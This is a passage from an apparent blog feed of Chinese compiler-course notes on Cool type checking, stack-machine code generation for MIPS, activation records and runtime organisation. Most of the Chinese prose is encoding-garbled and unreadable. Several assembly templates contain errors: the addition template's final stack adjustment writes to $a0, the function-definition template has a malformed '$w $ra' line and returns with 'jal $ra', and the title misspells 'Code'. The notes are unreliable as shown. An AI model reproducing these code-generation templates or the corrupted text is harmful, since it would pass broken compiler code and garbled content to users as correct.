expressions</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">let y: Int &lt;- x + 2 in y + 2<br><span class="hljs-keyword">error: </span>x is undefind: =&gt; x is Object<br><span class="hljs-keyword">error: </span>+ applied to Object =&gt; x + 2 is Object <br><span class="hljs-keyword">error: </span>bad assimend =&gt; ... (Int and Object is incompatible)<br></code></pre></td></tr></table></figure><p><strong>æ–¹æ³•2:</strong></p><p>introduce <code>No_type</code> for use with ill-typed expressions</p><ul><li>DefineNo_type &lt;= C for all types C</li><li>Every operation os defined for No_type<ul><li>With a. No_type result</li></ul></li></ul><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">let</span> y: Int &lt;- x + <span class="hljs-number">2</span> <span class="hljs-keyword">in</span> y + <span class="hljs-number">2</span><br>x <span class="hljs-keyword">is</span> No_type =&gt; x + <span class="hljs-number">2</span> <span class="hljs-keyword">is</span> No_type =&gt; <span class="hljs-literal">no</span> error becuse No_type <span class="hljs-keyword">is</span> subtype <span class="hljs-keyword">of</span> any type<br></code></pre></td></tr></table></figure><p>æ€»ç»“ï¼š</p><p>å®é™…ç¼–è¯‘å™¨ä¹Ÿä¼šä½¿ç”¨ç±»ä¼¼No_typeçš„ä¸œè¥¿</p><p>ç„¶è€Œï¼Œå¼•å…¥No_typeä¼šå¸¦æ¥è·Ÿå¤šå¤æ‚æ€§ï¼šç±»çš„ç»§æ‰¿ç»“æ„å°†ä¸å†æ˜¯æ ‘çŠ¶ï¼Œå› ä¸ºæ¯ä¸ªç±»éƒ½æœ‰ä¸€ä¸ªå­ç±»</p><blockquote><p>coolé‡Œä½¿ç”¨äº†ç¬¬ä¸€ç§æ–¹æ¡ˆ</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>ç¼–è¯‘åŸç†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¼–è¯‘åŸç†ï¼Œè®¡ç®—æœºåŸºç¡€ï¼Œcool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ–¯å¦ç¦cs231(ç¼–è¯‘åŸç†)ã® 7 Cool Gode Generation</title>
    <link href="/emocoder/2023/06/03/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%83/"/>
    <url>/emocoder/2023/06/03/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%83/</url>
    
    <content type="html"><![CDATA[<h2 id="ä»£ç ç”Ÿæˆç®€ä»‹">ä»£ç ç”Ÿæˆç®€ä»‹</h2><p>å°†astè½¬æ¢ä¸ºæ±‡ç¼–ä»£ç ï¼Œå…·ä½“è¿™é‡Œæ˜¯mipsæ±‡ç¼–æŒ‡ä»¤ï¼Œcoolé‡Œä½¿ç”¨äº†ç´¯åŠ å¯„å­˜å™¨<code>$a0</code></p><p>å †æ ˆåœ¨å†…å­˜ä¸­ï¼Œï¼Œå †æ ˆç”±é«˜åœ°å€åƒä½åœ°å€æ‰©å¢</p><p>å †æ ˆæŒ‡é’ˆï¼š<code>$sp</code> or <code>$29</code></p><p>å…·ä½“çš„mipsæŒ‡ä»¤å¯ä»¥å‚è€ƒï¼šmispæ–‡æ¡£</p><p>å®šä¹‰ç®€å•å‡½æ•°ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">def</span> fib(x) = if x = <span class="hljs-number">1</span> then <span class="hljs-number">0</span> else <br> <span class="hljs-attribute">if</span> x = <span class="hljs-number">2</span> then <span class="hljs-number">1</span> else<br> <span class="hljs-attribute">fib</span>(x-<span class="hljs-number">1</span>) + fib(x-<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>å¯¹äºæ¯ä¸€ä¸ªè¡¨è¾¾å¼eï¼Œå¯ä»¥ç”Ÿæˆå¦‚ä¸‹MISPä»£ç ï¼š</p><ul><li>Computes the value of e in<code>$a0</code>ï¼ˆè®¡ç®—è¡¨è¾¾å¼eçš„å€¼ï¼Œå¹¶å­˜å‚¨åœ¨<code>$a0</code>å¯„å­˜å™¨ä¸­ï¼‰</li><li>Preservers <code>$sp</code> and the contents of stack(ç»´æŠ¤<code>$sp</code> æŒ‡é’ˆ)</li></ul><p>è¿™æ ·æˆ‘ä»¬å¯ä»¥å®šä¹‰<code>cgen(e)</code>è¡¨ç¤ºä¸ºeçš„ä»£ç ç”Ÿæˆï¼Œå¹¶åœ¨æœ€åå°†eçš„å€¼å­˜äº<code>$a0</code> ä¸­</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">cgen</span><span class="hljs-params">(i)</span></span> = <span class="hljs-selector-tag">li</span> <span class="hljs-variable">$a0</span> i<br></code></pre></td></tr></table></figure><blockquote><p>ä»£ç ç”Ÿæˆæ˜¯åœ¨ç¼–è¯‘é˜¶æ®µ</p><p>æ±‡ç¼–ä»£ç çš„æ‰§è¡Œæ˜¯åœ¨è¿è¡Œæ—¶</p></blockquote><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cgen(e1 + e2) = <br>cgen(e1)<br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">a0</span> <span class="hljs-number">0</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">sp</span> $<span class="hljs-built_in">sp</span> -<span class="hljs-number">4</span><br>cgen(e2)<br><span class="hljs-keyword">lw </span>$<span class="hljs-built_in">t1</span> <span class="hljs-number">4</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">add </span>$<span class="hljs-built_in">a0</span> $<span class="hljs-built_in">t1</span> $<span class="hljs-built_in">a0</span><br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">a0</span> $<span class="hljs-built_in">sp</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>å…¶å®ä¹Ÿå°±æ˜¯è¾“å‡ºå¯¹åº”çš„æ±‡ç¼–ä»£ç </p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dart">cgen(e1 + e2) = <br>cgen(e1)<br>cout &lt;&lt; <span class="hljs-string">&#x27;sw <span class="hljs-subst">$a0</span> 0(<span class="hljs-subst">$sp</span>)&#x27;</span>;<br>cout &lt;&lt; <span class="hljs-string">&#x27;addiu <span class="hljs-subst">$sp</span> <span class="hljs-subst">$sp</span> -4;&#x27;</span><br>cgen(e2)<br>cout &lt;&lt; <span class="hljs-string">&#x27;lw <span class="hljs-subst">$t1</span> 4(<span class="hljs-subst">$sp</span>)&#x27;</span>;<br>cout &lt;&lt; <span class="hljs-string">&#x27;add <span class="hljs-subst">$a0</span> <span class="hljs-subst">$t1</span> <span class="hljs-subst">$a0</span>&#x27;</span>;<br>cout &lt;&lt; <span class="hljs-string">&#x27;addiu <span class="hljs-subst">$a0</span> <span class="hljs-subst">$sp</span> 4&#x27;</span>;<br></code></pre></td></tr></table></figure><ul><li>ä¸Šé¢ä¸º+ç”Ÿæˆæ±‡ç¼–ä»£ç çš„è¿‡ç¨‹ï¼Œå¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªæ¨¡æ¿ï¼Œå…¶ä¸­cgen(e1)å’Œcgen(e2)å°±æ˜¯æ’æ§½</li><li>ä»£ç ç”Ÿæˆæ˜¯é€’å½’çš„ï¼Œe1å’Œe2ä¹Ÿå¯ç»§ç»­å‘ä¸‹ç”Ÿæˆä»£ç </li><li>ä»£ç ç”Ÿæˆå¯ä»¥æ˜¯æ²¿ç€ASTè‡ªé¡¶å‘ä¸‹é€’å½’çš„ï¼Œè‡³å°‘å¯¹äºè¡¨è¾¾å¼æ˜¯å¯ä»¥çš„</li></ul><p>ä¸‹é¢çœ‹ä¸€ä¸ªå‡½æ•°çš„ä¾‹å­ï¼Œå‡½æ•°æœ‰è°ƒç”¨å’Œå‡½æ•°å®šä¹‰ä¸¤éƒ¨åˆ†ï¼Œè¿™ä¸¤è€…éƒ½ä¾èµ–äºAR(Activerecord or function frame)</p><p>ç®€å•çš„æ ˆzhenæ»¡è¶³å¦‚ä¸‹è§„åˆ™å³å¯ï¼š</p><ul><li>ç»“æœæ€»æ˜¯å­˜å‚¨åœ¨<code>$a0</code>ä¸­ï¼Œæ¯”å¦‚ä¸¤è€…ä¹‹å’Œå°±å¯ä»¥å­˜äº<code>$a0</code> ä¸­</li><li>æ ˆzhenåŒ…å«å®é™…å‚æ•°ï¼Œä¹Ÿå°±æ˜¯<code>f(x1, x2, ... xn)</code> å°†ä¼špush<code>xn, ... x1</code> å…¥æ ˆ</li><li>åœ¨è¿™ä¸ªç®€å•çš„ä¾‹å­åªè®¾è®¡å‚æ•°ï¼Œä¸åŒ…å«å±€éƒ¨å˜é‡</li><li>å¦å¤–ï¼Œå¯¹äºmipsæ¶æ„ï¼Œéœ€è¦åœ¨æ ˆzhenå†…è®°å½•å‡½æ•°çš„è¿”å›åœ°å€</li><li>è®°å½•å‡½æ•°æ ˆzhenèµ·å§‹åœ°å€ï¼š<code>fp</code></li><li>mipsè·³è½¬æŒ‡ä»¤ï¼š<code>jal label</code></li></ul><p>å¯¹äºå‡½æ•°è°ƒç”¨ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cgen(f(e1, ... en)) = <br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">fp</span> <span class="hljs-number">0</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">sp</span> $<span class="hljs-built_in">sp</span> -<span class="hljs-number">4</span><br>cgen(en)<br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">a0</span> <span class="hljs-number">0</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">sp</span> $<span class="hljs-built_in">sp</span> -<span class="hljs-number">4</span><br>...<br>cgen(e1)<br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">a0</span> <span class="hljs-number">0</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">sp</span> $<span class="hljs-built_in">sp</span> -<span class="hljs-number">4</span><br><span class="hljs-keyword">jal </span>f_entry<br></code></pre></td></tr></table></figure><ul><li>å‡½æ•°è°ƒç”¨çš„æ—¶å€™ï¼Œä¿å­˜äº†fp</li><li>é€†åºä¿å­˜äº†å®é™…å‚æ•°</li><li>å‡½æ•°è·³è½¬çš„æ—¶å€™ï¼Œè¿”å›åœ°å€<code>$ra</code>æ˜¯è‡ªåŠ¨ä¿å­˜çš„ï¼Œè¿™æ˜¯åº•å±‚å®ç°çš„ï¼Œæˆ‘ä»¬ä¸ç”¨ç®¡</li><li>ä¸€ä¸ªä½¿ç”¨äº†å¤šå°‘ç©ºé—´ï¼š4*n + 4 bytes,næ˜¯å‚æ•°ä¸ªæ•°ï¼Œ+4æ˜¯ä¸€ä¸ª<code>fp</code> æŒ‡é’ˆ</li></ul><p>å¯¹äºå‡½æ•°å®šä¹‰ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">cgen(def f(x1, ... xn) = e) = <br>move <span class="hljs-variable">$fp</span> <span class="hljs-variable">$sp</span> <span class="hljs-regexp">//</span> æ–°çš„å‡½æ•°èµ·å§‹åœ°å€<br><span class="hljs-variable">$w</span> <span class="hljs-variable">$ra</span> <span class="hljs-number">0</span>(<span class="hljs-variable">$sp</span>) <span class="hljs-regexp">//</span> ä¿å­˜è¿”å›åœ°å€<br>addiu <span class="hljs-variable">$sp</span> <span class="hljs-variable">$sp</span> -<span class="hljs-number">4</span> <span class="hljs-regexp">//</span> æ‰©å¢<br>cgen(e) <span class="hljs-regexp">//</span> é€’å½’ç”Ÿæˆe<br>lw <span class="hljs-variable">$ra</span> <span class="hljs-number">4</span>(<span class="hljs-variable">$sp</span>) <span class="hljs-regexp">//</span> åŠ è½½è¿”å›åœ°å€<br>addiu <span class="hljs-variable">$sp</span> <span class="hljs-variable">$sp</span> z <span class="hljs-regexp">//</span> æ¢å¤æ ˆç©ºé—´<br>jal <span class="hljs-variable">$ra</span> <span class="hljs-regexp">//</span> è·³è½¬å›å»<br></code></pre></td></tr></table></figure><ul><li>fpåœ¨é«˜åœ°å€å¤„</li><li>calleeï¼ˆè¢«è°ƒç”¨è€…ï¼‰</li><li>z = 4 * n + 8ï¼Œnæ˜¯å®é™…å‚æ•°ï¼Œ8æ˜¯<code>$ra</code> å’Œ<code>$fp</code></li></ul><p>ä¸Šé¢çš„å®ç°æ–¹å¼å¯ä»¥å®ç°ç®€å•å‡½æ•°ï¼š</p><ul><li>å‡½æ•°ä¸å­˜åœ¨å±€éƒ¨å˜é‡ï¼Œä»…ä»…æœ‰å‚æ•°</li><li>å®é™…å‚æ•°æ˜¯caller pushå…¥æ ˆçš„</li></ul><p>å­˜åœ¨é—®é¢˜ï¼šè®¡ç®—çš„ä¸­é—´ç»“æœæ”¾åœ¨æ ˆå†…ï¼Œå˜é‡(å‚æ•°)å¹¶ä¸èƒ½åŸºäº$spè¿›è¡Œåç§»é‡æŸ¥è¯¢ï¼Œå› ä¸ºä¸å¥½ç¡®å®šä½¿ç”¨äº†å¤šå°‘ä¸­é—´å˜é‡</p><p>è§£å†³æ–¹æ³•ï¼šä½¿ç”¨fpæŸ¥è¯¢å˜é‡(å‚æ•°)</p><ul><li>fpå§‹ç»ˆæŒ‡å‘è¿”å›åœ°å€ï¼Œè¿™æ ·ä¸ç®¡æ ˆæ€ä¹ˆæ‰©å¢ï¼Œfpæ˜¯ä¸å˜çš„ï¼Œæˆ‘ä»¬å¯ä»¥å§‹ç»ˆåŸºäºfpæŸ¥è¯¢å˜é‡ï¼ˆå‚æ•°ï¼‰</li></ul><p>xiè¡¨ç¤ºç¬¬iä¸ªå®é™…å‚æ•°ï¼Œé‚£ä¹ˆå…³äºxiçš„ä»£ç ç”Ÿæˆå¦‚ä¸‹ï¼š</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">cgen</span><span class="hljs-params">(xi)</span> = </span><br><span class="hljs-function"><span class="hljs-title">lw</span> $<span class="hljs-title">a0</span> <span class="hljs-title">z</span><span class="hljs-params">($fp)</span> <span class="hljs-params">(z = <span class="hljs-number">4</span> * i)</span></span><br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š<code>def f(x, y) = e</code></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">[<br>old <span class="hljs-built_in">fp</span>,<br>y,<br>x,<br>return <span class="hljs-keyword">addr, </span>&lt;= <span class="hljs-built_in">fp</span><br>? &lt;= <span class="hljs-built_in">sp</span><br>]<br>X is <span class="hljs-built_in">at</span> <span class="hljs-built_in">fp</span> + <span class="hljs-number">4</span><br>Y is <span class="hljs-built_in">at</span> <span class="hljs-built_in">fp</span> + <span class="hljs-number">8</span><br><br></code></pre></td></tr></table></figure><p>ç°å®ä¸­çš„å¯„å­˜å™¨ï¼š</p><ul><li>å°½é‡å°†å€¼ä¿å­˜åœ¨å¯„å­˜å™¨ä¸­ï¼Œå› ä¸ºæ›´å¿«</li><li>ä¸­é—´å€¼æ˜¯è¢«è®¾è®¡åœ¨ARä¸­ï¼Œæœ‰ç€ä¸€å®šçš„æ’åˆ—æ–¹å¼ï¼Œå¯ä»¥åœ¨åç»­ç« èŠ‚ä¸­çœ‹åˆ°å¦‚ä½•ä½¿ç”¨ä¸´æ—¶å˜é‡ï¼Œå¹¶æŠŠä¸´æ—¶å˜é‡å­˜åœ¨ARä¸­ï¼Œè€Œéä¸€å‘³åœ°pushå’Œpop</li></ul><p>æ¥çœ‹ä¸€ä¸ªå®Œæ•´çš„ä¾‹å­ï¼š</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">def</span> <span class="hljs-function"><span class="hljs-title">sumto</span>(<span class="hljs-variable">x</span>) = <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">x</span> = <span class="hljs-number">0</span> <span class="hljs-variable">then</span> <span class="hljs-number">0</span> <span class="hljs-variable"><span class="hljs-keyword">else</span></span> <span class="hljs-variable">x</span> + <span class="hljs-title">sumto</span>(<span class="hljs-variable">x</span> â€“ <span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure><p>ä¸ºä»¥ä¸Šå‡½æ•°ç”Ÿæˆä»£ç ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#x in ra</span><br>sumto_entry:<br>move<span class="hljs-variable">$fp</span><span class="hljs-variable">$sp</span>#<span class="hljs-attribute">fp</span>=sp<br>sw<span class="hljs-variable">$ra</span>0(<span class="hljs-variable">$sp</span>)#*<span class="hljs-attribute">sp</span>=ra<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>-4#<span class="hljs-attribute">sp-</span>=4<br>lw<span class="hljs-variable">$a0</span>4(<span class="hljs-variable">$fp</span>)#<span class="hljs-attribute">a0</span>=*(sp+4)(a0=x)<br>sw<span class="hljs-variable">$a0</span>0(<span class="hljs-variable">$sp</span>)#*<span class="hljs-attribute">sp</span>=a0<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>-4#<span class="hljs-attribute">sp-</span>=4<br>li<span class="hljs-variable">$a0</span>0#<span class="hljs-attribute">a0</span>=0<br>lw<span class="hljs-variable">$t1</span>4(<span class="hljs-variable">$sp</span>)#<span class="hljs-attribute">t1</span>=*(sp+4)(t1=a0=x)<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>+4#sp+=4<br>beq<span class="hljs-variable">$a0</span><span class="hljs-variable">$t1</span>true1#<span class="hljs-keyword">if</span> <span class="hljs-attribute">a0</span>=t1, goto true1<br>false1:#x <span class="hljs-keyword">in</span> sp - 4<br>lw<span class="hljs-variable">$a0</span>4(<span class="hljs-variable">$fp</span>)#<span class="hljs-attribute">a0</span>=*(4+fp)<br>sw<span class="hljs-variable">$a0</span>0(<span class="hljs-variable">$sp</span>)#*<span class="hljs-attribute">sp</span>=a0<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>-4#<span class="hljs-attribute">sp-</span>=4<br>sw<span class="hljs-variable">$fp</span>0(<span class="hljs-variable">$sp</span>)#*<span class="hljs-attribute">sp</span>=fp<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>-4#<span class="hljs-attribute">sp-</span>=4<br>lw<span class="hljs-variable">$a0</span>4(<span class="hljs-variable">$fp</span>)#<span class="hljs-attribute">a0</span>=*(4+fp)<br>sw<span class="hljs-variable">$a0</span>0(<span class="hljs-variable">$sp</span>)#*<span class="hljs-attribute">sp</span>=a0<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>-4#<span class="hljs-attribute">sp-</span>=4<br>li<span class="hljs-variable">$a0</span>1#<span class="hljs-attribute">a0</span>=1<br>lw<span class="hljs-variable">$t1</span>4(<span class="hljs-variable">$sp</span>)#<span class="hljs-attribute">t1</span>=*(4+sp)<br>sub<span class="hljs-variable">$a0</span><span class="hljs-variable">$t1</span><span class="hljs-variable">$a0</span>#<span class="hljs-attribute">a0</span>=t1-a0(a0=x-1)<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>4#sp+=4<br>sw<span class="hljs-variable">$a0</span>0(<span class="hljs-variable">$sp</span>)#*<span class="hljs-attribute">sp</span>=a0<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>-4#<span class="hljs-attribute">sp-</span>=4<br>jalsumto_entry#goto sumto_entry<br>lw<span class="hljs-variable">$t1</span>4(<span class="hljs-variable">$sp</span>)#<span class="hljs-attribute">t1</span>=*(4+sp)<br><span class="hljs-built_in">add</span><span class="hljs-variable">$a0</span><span class="hljs-variable">$t1</span><span class="hljs-variable">$a0</span>#<span class="hljs-attribute">a0</span>=t1+a0<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>4#sp+=4<br>jalendif1<br>true1:<br>li<span class="hljs-variable">$a0</span>0#<span class="hljs-attribute">a0</span>=0<br>endif1:#æ¢å¤è°ƒç”¨å‰çš„çŠ¶æ€<br>lw<span class="hljs-variable">$ra</span>4(<span class="hljs-variable">$sp</span>)#<span class="hljs-attribute">ra</span>=*(4+sp)<br>addiu<span class="hljs-variable">$sp</span><span class="hljs-variable">$sp</span>12#sp+=12<br>lw<span class="hljs-variable">$fp</span>0(<span class="hljs-variable">$sp</span>)#<span class="hljs-attribute">fp</span>=*sp<br>jr<span class="hljs-variable">$ra</span>#goto<span class="hljs-built_in"> address </span><span class="hljs-keyword">in</span> ra<br></code></pre></td></tr></table></figure><p>æ€»ç»“ï¼š</p><ul><li>ARå¿…é¡»å’Œä»£ç ç”Ÿæˆå™¨ä¸€åŒè®¾è®¡</li><li>ä»£ç ç”Ÿæˆå¯ä»¥é€šè¿‡éå†ASTé€’å½’åšåˆ°</li><li>æ¨èä½¿ç”¨å †æ ˆæœºç”Ÿæˆä»£ç ï¼Œæ¯”è¾ƒç®€å•ï¼Œå¤§å¤šæ•°è¯­è¨€éƒ½æ˜¯å¦‚æ­¤</li></ul><p>è¿è¡Œæ—¶ç»„ç»‡ï¼šä¸»è¦æ˜¯ä¸ºäº†ç»„ç»‡è¿è¡Œæ—¶ä»£ç (ç‹­ä¹‰æŒ‡è¿è¡Œæ—¶ä»£ç ç”Ÿæˆ)</p><p>ä»£ç ç”Ÿæˆçš„ç›®æ ‡ï¼šå‡†ç¡®å’Œå¿«</p><p>ä»£ç ç”Ÿæˆçš„ä¸¤ä¸ªå‡è®¾ï¼š</p><ul><li>ä»£ç æ‰§è¡Œæ˜¯ä¸²è¡Œçš„ï¼Œå³ä»ä¸Šè‡³ä¸‹ä¸€ä¸ªè¯­å¥æ¥ç€ä¸€ä¸ªè¯­å¥æŒ‰ç…§æ—¢å®šçš„é¡ºåºæ‰§è¡Œ</li><li>å½“ç¨‹åºè¢«è°ƒç”¨ç»“æŸåï¼Œæ§åˆ¶æƒåº”è¯¥äº¤ç»™æ‰§è¡Œæœ¬æ¬¡è°ƒç”¨çš„åä¸€æ¡è¯­å¥</li></ul><p>å½“ç„¶æœ‰äº›è¯­è¨€è¿èƒŒäº†è¿™ä¸¤æ¡å‡è®¾ï¼Œæ¯”å¦‚è¯´å¹¶è¡Œ</p><p>å˜é‡xçš„ç”Ÿå‘½å‘¨æœŸï¼šå˜é‡xèµ·ä½œç”¨çš„ä¸€æ®µèŒƒå›´ï¼ˆç”Ÿå‘½å‘¨æœŸæ˜¯ä¸€ä¸ªåŠ¨æ€ï¼ˆè¿è¡Œæ—¶ï¼‰æ¦‚å¿µï¼Œè€Œä½œç”¨åŸŸæ˜¯ä¸€ä¸ªé™æ€æ¦‚å¿µï¼‰</p><h2 id="rutime-organization">Rutime Organization</h2><p>ä¸»è¦æ˜¯ç»„ç»‡ä»£ç ç”Ÿæˆçš„è®¾è®¡åŠç›¸å…³è®¡ç®—æ¨¡å‹ï¼Œæ¶‰åŠä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>è¿è¡Œæ—¶çš„èµ„æºç®¡ç†</li><li>å­˜å‚¨ç®¡ç†</li><li>è¿è¡Œæ—¶çš„è®¡ç®—æ¨¡å‹</li></ul><p>å‰é¢å·²ç»è®²è¿°ä¸‰éƒ¨åˆ†å†…å®¹ï¼š</p><ul><li>Lexical analysis</li><li>parsing</li><li>semantic analysis</li></ul><p><strong>è¿™ä¸‰éƒ¨åˆ†éƒ½æ˜¯åŠ å¼ºè¯­è¨€å®šä¹‰çš„æ–¹å¼</strong></p><p>ç¨‹åºçš„æ‰§è¡Œæ–¹å¼ï¼š</p><ol type="1"><li>OSä¸ºè¯¥ç¨‹åºåˆ†é…ç©ºé—´</li><li>ä»£ç åŒ—åŠ å·åˆ°è¿™éƒ¨åˆ†ç©ºé—´</li><li>OSè·³è½¬åˆ°ç¨‹åºçš„å…¥å£</li></ol><p>ç¨‹åºçš„å†…å­˜å¸ƒå±€ï¼š <imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week6%20P1/2021042401.jpg?raw=true"alt="img" /></p><p>å¦‚ä¸Šï¼ŒæŒ‰ç…§ä¼ ç»Ÿæ–¹å¼ï¼Œç¨‹åºçš„å†…å­˜å¸ƒå±€å¦‚ä¸‹ï¼Œä¸Šé¢å›¾ç‰‡æ˜¯ç®€åŒ–çš„ï¼Œå®é™…æƒ…å†µä¸‹å†…å­˜ä¸ä¸€å®šæ˜¯è¿ç»­çš„ï¼š</p><ul><li><p>é¡¶éƒ¨çš„ä½åœ°å€æ˜¯ä»£ç æ®µ</p></li><li><p>åº•éƒ¨çš„é«˜åœ°å€</p></li></ul><p>ä»£ç ç”Ÿæˆçš„ç›®æ ‡ï¼š</p><ul><li>ç”Ÿæˆæ­£ç¡®çš„ä»£ç </li><li>ç”Ÿæˆçš„ä»£ç å¿«</li></ul><p>ä¼ ç»Ÿæ„ä¹‰ä¸Šé‡Œç”Ÿæˆçš„ä»£ç åŸºäºä»¥ä¸‹ä¸¤ä¸ªå‡è®¾ï¼š</p><ul><li>æ‰§è¡Œæ˜¯é¡ºåºçš„ï¼Œæ§åˆ¶æµä»ç¨‹åºä¸­çš„ä¸€ä¸ªä½ç½®æŒ‰å®šä¹‰å¥½çš„é¡ºåºç§»åŠ¨åˆ°å¦ä¸€ä¸ªä½ç½®ã€‚</li><li>è°ƒç”¨è¿‡ç¨‹æ—¶ï¼Œæ§åˆ¶æµæ€»æ˜¯è¿”å›åˆ°è°ƒç”¨åçš„ä½ç½®ã€‚</li></ul><blockquote><p>å½“ç„¶æœ‰çš„ç¨‹åºè¯­è¨€è¿èƒŒäº†è¿™ä¸¤ä¸ªå‡è®¾ï¼Œæ¯”å¦‚å¯å¹¶è¡Œè¿è¡Œçš„è¯­è¨€</p></blockquote><p><strong>ç¨‹åºçš„æ¿€æ´»</strong></p><p>æ¿€æ´»ï¼šå¯¹å­ç¨‹åºPçš„è°ƒç”¨ï¼Œç§°ä¹‹ä¸ºå¯¹Pçš„æ¿€æ´»ï¼ŒPçš„æ¿€æ´»çš„ç”Ÿå‘½å‘¨æœŸä¸ºæ‰§è¡ŒPçš„æ‰€æœ‰æ­¥éª¤ï¼ˆå˜é‡xçš„ç”Ÿå‘½å‘¨æœŸæ˜¯å®šä¹‰xçš„æ‰§è¡Œéƒ¨åˆ†ï¼‰</p><blockquote><p>ç”Ÿå‘½å‘¨æœŸæ˜¯ä¸€ä¸ªåŠ¨æ€çš„è¿è¡Œæ—¶æ¦‚å¿µï¼Œè€Œä½œç”¨åŸŸæ˜¯ä¸€ä¸ªé™æ€æ¦‚å¿µ</p></blockquote><p>å¯¹äºéå¹¶è¡Œç¨‹åºï¼Œæ¿€æ´»æ˜¯çº¿æ€§çš„</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">Class</span> <span class="hljs-variable">Main</span> 